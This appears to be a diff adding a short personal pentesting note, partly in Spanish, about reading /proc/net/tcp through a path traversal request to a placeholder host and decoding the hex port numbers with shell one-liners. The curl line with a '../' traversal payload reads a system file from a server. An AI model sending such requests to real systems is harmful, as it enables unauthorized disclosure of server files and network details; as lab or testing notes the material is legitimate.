@@ -1,0 +1,19 @@
+
+	/proc/net/tcp
+
+
+:::  curl  -s  -X  GET    "http://targed_url.test/../../../../../../../../proc/net/tcp"
+
+  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
+   0: 1712A8C0:A328 45EFB06D:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 182182 1 00000000b03cdefa 21 4 26 10 -1                   
+   1: 1712A8C0:A336 45EFB06D:01BB 01 00000000:00000000 02:0000B344 00000000  1000        0 182183 2 00000000685c559e 22 4 31 10 -1                   
+   2: 1712A8C0:B09A 49A79110:01BB 01 00000000:00000000 02:0000972C 00000000  1000        0 138556 3 000000004db7c50a 37 4 30 10 -1                   
+
+							 A328
+							 A336
+							 B09A
+	
+::: echo "A328
+					A336
+					B09A" | sort -u | while read port; do echo "==> $port -> $((0x$port))"; done					.....<3 <3 <3 mejor metodo y no usa bc  ....<3 <3 <3
+					............... | while read port; do echo "==> $port -> $(echo "obase=10; ibase=16; $port" | bc)"; done
